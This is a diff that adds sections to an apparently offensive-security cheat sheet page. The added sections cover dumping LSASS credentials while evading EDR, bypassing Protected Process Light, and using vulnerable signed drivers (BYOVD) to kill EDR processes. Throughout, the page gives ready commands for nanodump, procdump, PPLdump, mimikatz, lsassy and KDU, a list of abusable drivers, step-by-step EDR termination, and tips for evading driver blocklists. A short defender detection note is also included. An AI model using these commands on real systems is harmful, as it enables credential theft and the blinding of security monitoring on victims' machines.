@@ -747,3 +747,114 @@ msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter
 # - Use EXIF injection: harder for AV to extract from JPEG EXIF fields
 # - Serve image over HTTPS from a CDN (blend with normal traffic)
 # - Use a named pipe or legitimate process for shellcode injection instead of self-exec</code></pre>
+
+  <h2>LSASS Dump — EDR-Evading Techniques</h2>
+  <p>Dumping LSASS (Local Security Authority Subsystem Service) memory extracts NTLM hashes and Kerberos tickets. EDR products heavily monitor LSASS access — standard Mimikatz/sekurlsa is detected by most modern EDR. These techniques reduce the detection signal.</p>
+  <pre><code># Direct syscall LSASS dump (bypasses userland hooks on OpenProcess/MiniDumpWriteDump):
+# NanoDump — writes a minidump of LSASS using direct syscalls or BOF:
+# github.com/helviojunior/nanodump
+nanodump --write C:\Windows\Temp\lsass.dmp --valid
+# --valid: adds valid minidump header so Mimikatz can parse offline
+
+# ProcDump (Microsoft signed binary — LOLBin):
+procdump.exe -accepteula -ma lsass.exe C:\temp\lsass.dmp
+# Detection: CreateRemoteThread into LSASS is still flagged by most EDR
+
+# Silentlydump (ntdll-based):
+# Creates a snapshot of LSASS using NtCreateProcessEx syscall — no OpenProcess call
+
+# NTDLS Cloning (bypass PPL — Process Protection Light):
+# Clone the LSASS process to an unprotected process, then dump the clone
+# Tool: PPLdump — github.com/itm4n/PPLdump
+PPLdump.exe lsass.exe C:\temp\clone.dmp
+
+# Token impersonation before dump (run as SYSTEM):
+# Impersonate SYSTEM token → open LSASS without triggering user-context alerts
+# Many EDR products monitor LSASS handle access from specific processes
+
+# Parse LSASS dump offline (on attacker machine, not target):
+# Avoids running Mimikatz on the target where AMSI/AV would catch it
+mimikatz.exe "sekurlsa::minidump C:\temp\lsass.dmp" "sekurlsa::logonpasswords" exit
+
+# Remote LSASS dump (Lsassy — Python):
+# Dumps LSASS remotely via WMI, SMB, or other methods
+lsassy -d corp.com -u admin -p 'Password123' -t 192.168.1.10</code></pre>
+
+  <h2>Protected Process Light (PPL) Bypass</h2>
+  <p>Windows PPL prevents even administrators from opening handles to protected processes like LSASS, Defender, and anti-cheat drivers. PPL bypass techniques use vulnerable kernel drivers to elevate to kernel and disable the protection flags.</p>
+  <pre><code># PPL levels (from highest to lowest):
+# WinTcb-Light: LSASS (most protected in modern Windows)
+# Windows-Light: Defender, some AV processes
+# Authenticode-Light: Third-party AV, EDR agents
+
+# PPLdump (itm4n) — exploits Windows error reporting to clone LSASS:
+# github.com/itm4n/PPLdump
+PPLdump.exe -v lsass.exe C:\temp\lsass.dmp
+# Does NOT require a kernel driver — uses LSASS error report trick
+# Works on: Windows 10/11 up to specific patch levels
+
+# SharpPPL (C# PPL bypass):
+# github.com/Am0nsec/SharpPPL
+SharpPPL.exe --action dump --process lsass.exe --output C:\temp\lsass.dmp
+
+# Kernel-level PPL bypass (BYOVD):
+# Load a vulnerable signed driver → exploit to get kernel code execution
+# Modify EPROCESS.Protection field to remove PPL flag for LSASS
+# Then dump with standard MiniDumpWriteDump
+
+# EDR agent protection bypass (target the EDR's PPL-protected process):
+# If EDR agent runs as PPL → standard process kill/inject fails
+# BYOVD → kernel access → disable PPL on EDR process → kill/inject</code></pre>
+
+  <h2>BYOVD — Bring Your Own Vulnerable Driver</h2>
+  <p>BYOVD uses a legitimate, Microsoft-signed but vulnerable kernel driver to achieve kernel-mode code execution. This bypasses kernel protections (PPL, DSE — Driver Signature Enforcement) and can kill EDR processes that are otherwise protected.</p>
+  <pre><code># BYOVD concept:
+# 1. Find a vulnerable SIGNED driver (kernel vulnerability, IOCTL exploit)
+# 2. Load it via sc.exe or NtLoadDriver (requires SeLoadDriverPrivilege → admin)
+# 3. Exploit the driver via IOCTL calls to run kernel code
+# 4. From kernel: disable PPL, kill EDR process, patch kernel callbacks
+
+# loldrivers.io — database of vulnerable kernel drivers:
+# Search: https://www.loldrivers.io/
+# Filter by: kill capabilities, vulnerability type, detection status
+
+# Common BYOVD drivers used in red team/ransomware:
+# Process Kill:   gdrv.sys (GigaByte), RTCore64.sys (MSI), mhyprot2.sys (MiHoYo)
+# Arbitrary write: speedfan.sys, KProcessHacker.sys (Process Hacker)
+# EDR termination: TrueSight (RealBlind), IOBITUNLOCKER64.sys
+
+# KDU (Kernel Driver Utility) — automates BYOVD for kernel driver attacks:
+# github.com/hfiref0x/KDU
+KDU.exe -list         # list supported vulnerable drivers
+KDU.exe -prv 9        # use driver #9 (GigaByte gdrv.sys)
+KDU.exe -dse 0        # disable Driver Signature Enforcement
+KDU.exe -ps PID       # kill a process by PID (bypasses PPL)
+
+# Terminating EDR process with BYOVD:
+# 1. Identify EDR process name/PID: tasklist | findstr /i "defender crowd falcon"
+# 2. Load vulnerable driver
+# 3. Call IOCTL to kill EDR process
+# 4. EDR is now dead, no further monitoring
+
+# Detection by defenders:
+# - Monitoring driver load events (Event ID 7045: new service installed)
+# - Sysmon Event ID 6: driver loaded
+# - Hashes of known malicious/vulnerable drivers (Defender's driver blocklist)
+# - Microsoft's vulnerable driver blocklist: updated Windows Defender signatures
+# Evasion: use recently discovered vulnerable drivers not yet in blocklist</code></pre>
+
+  <h2>Resources</h2>
+  <ul>
+    <li>SysWhispers2 — direct syscall generator — <code>github.com/jthuraisamy/SysWhispers2</code></li>
+    <li>SysWhispers3 — indirect syscall support — <code>github.com/klezVirus/SysWhispers3</code></li>
+    <li>HellsGate / HalosGate — syscall enumeration — <code>github.com/am0nsec/HellsGate</code></li>
+    <li>Hookchain — advanced unhooking — <code>github.com/helviojunior/hookchain</code></li>
+    <li>al-khaser — anti-VM/debug/sandbox test suite — <code>github.com/LordNoteworthy/al-khaser</code></li>
+    <li>PPLdump — PPL bypass without kernel driver — <code>github.com/itm4n/PPLdump</code></li>
+    <li>KDU — Kernel Driver Utility (BYOVD automation) — <code>github.com/hfiref0x/KDU</code></li>
+    <li>loldrivers.io — vulnerable driver database — <code>loldrivers.io</code></li>
+    <li>NanoDump — stealthy LSASS dump — <code>github.com/helviojunior/nanodump</code></li>
+    <li>ThreatCheck — identify Defender signature bytes — <code>github.com/rasta-mouse/ThreatCheck</code></li>
+    <li>Awesome EDR Bypass reference — <code>github.com/tkmru/awesome-edr-bypass</code></li>
+    <li>Cocomelonc malware dev blog — <code>cocomelonc.github.io</code></li>
+  </ul>
